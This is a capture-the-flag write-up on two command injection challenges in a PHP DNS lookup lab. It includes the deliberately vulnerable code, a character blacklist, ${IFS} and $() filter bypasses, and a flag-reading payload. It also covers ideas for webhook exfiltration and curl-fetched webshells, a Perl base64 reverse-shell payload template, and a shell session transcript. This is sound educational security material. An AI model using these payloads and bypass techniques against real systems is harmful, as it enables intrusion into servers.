# DNS Lookup Tool Writeup

Tag: `Command Injection`

2 command injection challenges.

## Challenge 1

[http://h4ck3r.quest:8300/](http://h4ck3r.quest:8300/)

```php
/*TL;DR*/
<?= shell_exec("host '" . $_POST['name'] . "';") ?>
<?php endif; ?>
/*TL;DR*/
```

## Writeup 1

Basically no protection so it's a cakewalk.

We can view the flag name by `ls` then `cat` it.

```
';cat /flag_44ebd3936a907d59;'
```

## Challenge 2

`host` service with a "safe" check.

[http://h4ck3r.quest:8301/](http://h4ck3r.quest:8301/)

```php
/*TL;DR*/
<?php
$blacklist = ['|', '&', ';', '>', '<', "\n", 'flag'];
$is_input_safe = true;
foreach ($blacklist as $bad_word)
    if (strstr($_POST['name'], $bad_word) !== false) $is_input_safe = false;

if ($is_input_safe)
    system("host '" . $_POST['name'] . "';");
else
    echo "HACKER!!!";
?>
/*TL;DR*/
```

## Writeup 2

There are a few interesting things I found during my try and error.

Reference material: [https://www.tr0y.wang/2019/05/13/OS%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/](https://www.tr0y.wang/2019/05/13/OS%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/)

### `system` in php

UPD: This concept is learned from the original course: `system` in php only displays stdout. So If we get some blank, that's because it's error message.

### Encoded characters

When I input some spaces, I found that the they have been specially encoded. Like if we input `1 2`, the output would be `Host 1\0322 not found:2(SERVFAIL)`, and the `\032` is the the ascii value of space character. So we cannot have spaces in our payload.

UPD: I watched the course again and I found out that the space seems ok...? The output is just weird. Maybe I'll test later.

And some special characters would be encoded, too.

However, it's REALLY easy to bypass the space being encoded, this is a really classic trick: use `${IFS}` so that the shell would recognize it as a space for some reason. (UPD: This trick failed in zsh, but bash works.)

### Some notes about the arguments of `post`

In some other command injection challenges, we will trigger an error to the command and the output of our desired command will be displayed in our error message. Like this challenge: [https://ctf.hackme.quest/ping/](https://ctf.hackme.quest/ping/) However, in this challenge, we cannot do that. If you play with host command for a while, you will see that it will print the result of the each lookup, separated by spaces. If our desired output has spaces, `host` will try to look up the first word of the output, not the full output. So we cannot use this method.
I know it's a little bit confusing, but I'll show you an example.

For example, assume that we have `a` and `b` and some other files under the directory. If we inject `ls`, the output would be `Host a not found: 3(NXDOMAIN)`. Why? Because the output of `ls` is `a b`, and `host` will try to look up `a` first, and then `b`. Understand?

### Exploit

Ok so no we have a few constraints:

1. No spaces.

2. No banned characters.

3. Cannot see the whole output.

Can we execute something?

Note: Let's pretend we do not know the directory of the flag (like real world cases).

### Payload Template

My payload would be like

```bash
'$(which${IFS}bash)'
```

Explanation: If we insert it into `"host '" . $_POST['name'] . "';"`m it would be like `host ''$(which${IFS}bash)'';`
The quotes with no content does nothing in shell (like an empty string). And using `$()` is a classic way to execute a command.

### Webhook to get the output

I know coming up this idea first is really strange. Maybe it's because I'm strange (?).

The gimmick is that we can send a post request to a webhook and ends with ``whoami``, so that we can get the output of `whoami` in the webhook.

But the problem of this exploitation is that we cannot see the whole output just like the error message case. And we cannot use `| base64` to encode the whole output because `|` is banned.

Not a good idea.

### Uploading a webshell?

Can we download the webshell and execute it? After some trying, I found that this machine doesn't have `wget` but has `curl`, so we can download files.

However, although our server get a response from `curl` (I setup a simple http server and monitor the request), we cannot write the output to a file. (Since we don't have write access). We are `www-data`, a really low-privileged user.

Failed...

### What if we know the flag directory in advance?

If we dive into the [Dockerfile of this challenge](https://github.com/splitline/How-to-Hack-Websites/blob/master/lab/cmd-injection/docker-compose.yml), we can see that the flag is at `/flag_f4b9830a65d9e956`, so we can use 

```bash
'$(cat /f*_*)'
```

to get the flag from the error message. (since the word `flag` is banned)

```bash
Host FLAG{Y0U_\$\(Byp4ssed\)_th3_`waf`} not found: 2(SERVFAIL)
```

What if the flag has spaces? So this is definitely not a general solution.

IMO, I think this is a really bad practice because in real world our goal is not reading a flag we already know where it is! We need to do something useful like remote control. I don't think you really solve this challenge by this method.

### We can get a reverse shell, really?

**Yes, exactly!** Here's the proof:

```bash
www-data@b10b0dfad73d:/var/www/html$ ls
ls
index.php
www-data@b10b0dfad73d:/var/www/html$ whoami
whoami
www-data
www-data@b10b0dfad73d:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@b10b0dfad73d:/var/www/html$ cd /
cd /
www-data@b10b0dfad73d:/$ ls 
ls
bin
boot
dev
etc
flag_f4b9830a65d9e956
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
www-data@b10b0dfad73d:/$ cat flag_f4b9830a65d9e956
cat flag_f4b9830a65d9e956
FLAG{Y0U_$(Byp4ssed)_th3_`waf`}
```

But it's not easy. Here are a few problems and how I conquer them.

### Problem 1: What program do we have?

We know that we need some program as an anchor to spawn a reverse shell. But what program do we have? We can use `which` to find out.

Consequently, we don't have python, that's sad since python is really powerful. But we still have bash (of course we have) and perl.

The problem is: `'&', ';', '>', '<'` has been banned! These are common characters in reverse shell payload.

### Problem 2: Bypassing the banned characters

OK so I know it's not easy to come up with this idea: we can use **base64 decode**! Since base64 decoding is good at preserving the whole data and since it is in "normal" characters, we can bypass the banned characters! So I use Perl to decode the base64 encoded payload, and we can use `system` function in perl, too!

Here's the final payload:

```bash
'$(perl${IFS}-MMIME::Base64${IFS}-e${IFS}"system(decode_base64('your_base64_encoded_payload'))")'
```

The shell successfully popped out, pwned! Phew, what a great challenge!

## Postscript

I think sometimes it's a good idea to solve the challenge in different ways. Coming up with unintended solution is always fun. For me, I would like to get the shell of every challenge if possible.
I think this challenge is really interesting and I really like it. I hope you like it, too. If you have any questions, please feel free to contact me. Thanks for reading!
